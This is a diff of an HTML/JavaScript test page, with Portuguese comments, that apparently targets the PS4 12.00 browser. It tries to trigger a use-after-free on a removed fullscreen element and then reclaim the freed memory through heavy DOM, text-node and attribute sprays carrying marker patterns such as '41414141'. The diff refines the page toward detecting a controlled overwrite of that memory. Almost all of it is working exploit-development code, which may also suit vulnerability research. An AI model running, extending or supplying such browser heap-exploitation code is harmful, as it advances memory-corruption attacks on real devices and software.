@@ -2,213 +2,189 @@
 <html>
 <head>
 <meta charset="UTF-8">
-<title>PS4 12.00 - UAF Aggressive Reclaim (REAL TEST)</title>
+<title>PS4 12.00 - UAF Aggressive Reclaim (Controlled Overwrite)</title>
 </head>
 <body style="background:#111;color:#0f0;font-family:monospace;">
 
-<h2>PS4 12.00 - UAF Aggressive Reclaim (Real Validation)</h2>
+<h2>UAF Aggressive Reclaim - Controlled Overwrite</h2>
 <button onclick="runTest()">Run Test</button>
 
 <script>
 
-// ==========================
-// 🔒 LOG SEGURO (ALERT)
-// ==========================
 let logBuffer = [];
 
-function log(msg) {
-    try { console.log(msg); } catch(e){}
+function log(msg){
+    try{console.log(msg);}catch(e){}
     logBuffer.push(msg);
 }
 
 // ==========================
 // HEAP SETUP (INALTERADO)
 // ==========================
-function setupHeap() {
-    let controllers = [];
-
-    for(let i = 0; i < 5000; i++) {
-        let arr = new Float64Array(8);
-        arr[0] = i;
-        controllers.push(arr);
+function setupHeap(){
+    let arr=[];
+    for(let i=0;i<5000;i++){
+        let a=new Float64Array(8);
+        a[0]=i;
+        arr.push(a);
     }
-
-    return controllers;
+    return arr;
 }
 
 // ==========================
-// FULLSCREEN (INALTERADO)
+// FULLSCREEN
 // ==========================
-function setupFullscreen() {
-    let fsTarget = document.createElement("div");
+function setupFullscreen(){
+    let fs=document.createElement("div");
 
-    fsTarget.innerHTML = "<h1>FULLSCREEN ACTIVE<br>Press OPTIONS</h1>";
+    fs.innerHTML="<h1 style='margin-top:20%;text-align:center;'>FULLSCREEN ACTIVE<br>Press OPTIONS</h1>";
 
-    fsTarget.style.position = "absolute";
-    fsTarget.style.top = "0";
-    fsTarget.style.left = "0";
-    fsTarget.style.width = "100%";
-    fsTarget.style.height = "100%";
-    fsTarget.style.background = "black";
+    fs.style.cssText="background:black;width:100%;height:100%;position:absolute;top:0;left:0;";
 
-    document.body.appendChild(fsTarget);
+    document.body.appendChild(fs);
 
-    fsTarget.webkitRequestFullscreen?.();
+    fs.webkitRequestFullscreen?.();
 
-    return fsTarget;
+    return fs;
 }
 
 // ==========================
-// 💣 AGGRESSIVE RECLAIM REAL
+// 💣 AGGRESSIVE RECLAIM (REFINADO)
 // ==========================
-function aggressiveReclaim() {
+function aggressiveReclaim(){
+
     log("[*] Aggressive reclaim iniciado");
 
-    let bucket = [];
+    let bucket=[];
 
-    // Fase 1 — churn pesado
-    for (let i = 0; i < 8000; i++) {
-        let el = document.createElement("div");
-        document.body.appendChild(el);
-        el.remove();
+    // churn
+    for(let i=0;i<8000;i++){
+        let e=document.createElement("div");
+        document.body.appendChild(e);
+        e.remove();
     }
 
-    // 🔥 Fase 2 — spray CONTROL (mesmo layout)
-    for (let i = 0; i < 12000; i++) {
-        let el = document.createElement("div");
+    // 🔥 CONTROL STRING SPRAY
+    for(let i=0;i<10000;i++){
+        let e=document.createElement("div");
 
-        el.innerHTML = "CONTROL_" + i;
-        el.style.position = "absolute";
-        el.style.width = "100%";
-        el.style.height = "100%";
+        // marcador forte
+        e.innerHTML="CTRL_"+i+"_41414141_42424242_43434343";
 
-        document.body.appendChild(el);
-        bucket.push(el);
+        document.body.appendChild(e);
+        bucket.push(e);
     }
 
-    // 🔥 Fase 3 — TextNode spray
-    for (let i = 0; i < 8000; i++) {
-        let txt = document.createTextNode("TXT_" + i);
-        document.body.appendChild(txt);
-        bucket.push(txt);
+    // TEXT spray
+    for(let i=0;i<10000;i++){
+        let t=document.createTextNode("TXT_"+i+"_BBBBBBBBBBBBBBBB");
+        document.body.appendChild(t);
+        bucket.push(t);
     }
 
-    // 🔥 Fase 4 — Attribute spray
-    for (let i = 0; i < 8000; i++) {
-        let el = document.createElement("div");
-        el.setAttribute("data-x", "ATTR_" + i);
-        document.body.appendChild(el);
-        bucket.push(el);
+    // ATTRIBUTE spray
+    for(let i=0;i<10000;i++){
+        let e=document.createElement("div");
+        e.setAttribute("data-x","ATTR_"+i+"_CCCCCCCC");
+        document.body.appendChild(e);
+        bucket.push(e);
     }
 
-    // 🔥 Fase 5 — churn final
-    for (let i = 0; i < 5000; i++) {
-        let el = document.createElement("span");
-        document.body.appendChild(el);
-        el.remove();
-    }
+    log("[*] Aggressive reclaim finalizado: "+bucket.length);
 
-    log("[*] Aggressive reclaim finalizado: " + bucket.length);
     return bucket;
 }
 
 // ==========================
-// 🔬 DETECÇÃO REAL DE UAF
+// 🔬 CHECK REAL
 // ==========================
-function checkUAF(fsTarget) {
+function checkUAF(fs){
 
     log("---- UAF CHECK ----");
 
-    try {
-        let html = fsTarget.innerHTML;
-        log("[CHECK] innerHTML = " + html);
+    try{
+        let v=fs.innerHTML;
 
-        // 🎯 DETECÇÃO REAL
-        if (html && html.includes("CONTROL_")) {
-            log("[!!!] UAF CONFIRMADO - REUSE DETECTADO");
+        log("[CHECK] innerHTML = "+v);
+
+        if(v &&
+           (v.includes("4141") ||
+            v.includes("4242") ||
+            v.includes("4343"))){
+
+            log("[!!!] OVERWRITE CONTROLADO DETECTADO");
         }
 
-        if (html === "X" || html.length === 1) {
-            log("[!!!] POSSIVEL CORRUPÇÃO DE STRING");
+        if(v && v.length <= 2){
+            log("[!!!] STRING CORROMPIDA (CURTA)");
         }
 
-    } catch(e) {
+    }catch(e){
         log("[UAF] innerHTML crash");
     }
 
-    try {
-        let parent = fsTarget.parentNode;
-        log("[CHECK] parent = " + parent);
-    } catch(e) {
-        log("[UAF] parent crash");
-    }
+    try{
+        log("[CHECK] parent = "+fs.parentNode);
+    }catch(e){}
 
-    try {
-        let rect = fsTarget.getBoundingClientRect();
-        log("[CHECK] layout = " + rect.width);
-    } catch(e) {
-        log("[!!!] UAF CRASH EM LAYOUT");
-    }
+    try{
+        log("[CHECK] layout = "+fs.offsetTop);
+    }catch(e){}
 
-    try {
-        fsTarget.innerHTML = "A";
+    try{
+        fs.innerHTML="A";
         log("[CHECK] write OK");
-    } catch(e) {
-        log("[!!!] WRITE CORROMPIDO");
+    }catch(e){
+        log("[UAF] write crash");
     }
 }
 
 // ==========================
 // TRIGGER (INALTERADO)
 // ==========================
-function trigger(fsTarget) {
+function trigger(fs){
 
     log("[*] Trigger");
 
-    try {
-        fsTarget.remove();
+    try{
+        fs.remove();
 
-        if (document.webkitIsFullScreen || document.fullscreenElement) {
+        if(document.webkitIsFullScreen){
             document.webkitExitFullscreen?.();
         }
 
-    } catch(e) {
-        log("[ERRO]");
-    }
+    }catch(e){}
 
-    // 🔥 janela crítica REAL
-    setTimeout(() => aggressiveReclaim(), 0);
-    setTimeout(() => aggressiveReclaim(), 50);
-    setTimeout(() => aggressiveReclaim(), 100);
+    setTimeout(()=>aggressiveReclaim(),0);
+    setTimeout(()=>aggressiveReclaim(),50);
+    setTimeout(()=>aggressiveReclaim(),100);
 
-    // 🔬 múltiplas probes
-    setTimeout(() => checkUAF(fsTarget), 20);
-    setTimeout(() => checkUAF(fsTarget), 80);
-    setTimeout(() => checkUAF(fsTarget), 160);
-    setTimeout(() => checkUAF(fsTarget), 250);
+    setTimeout(()=>checkUAF(fs),100);
+    setTimeout(()=>checkUAF(fs),200);
+    setTimeout(()=>checkUAF(fs),300);
 
-    // 📦 dump via alert (SEGURO)
-    setTimeout(() => {
+    setTimeout(()=>{
         alert(logBuffer.join("\n"));
-    }, 400);
+    },400);
 
-    setTimeout(() => location.reload(), 500);
+    setTimeout(()=>location.reload(),500);
 }
 
 // ==========================
-// MAIN (INALTERADO)
+// MAIN
 // ==========================
-function runTest() {
+function runTest(){
 
     log("[*] Iniciando teste");
 
-    let controllers = setupHeap();
-    let fsTarget = setupFullscreen();
+    setupHeap();
 
-    window.onblur = function() {
+    let fs=setupFullscreen();
+
+    window.onblur=function(){
         log("[*] onblur");
 
-        setTimeout(() => trigger(fsTarget), 3000);
+        setTimeout(()=>trigger(fs),3000);
     };
 }
 
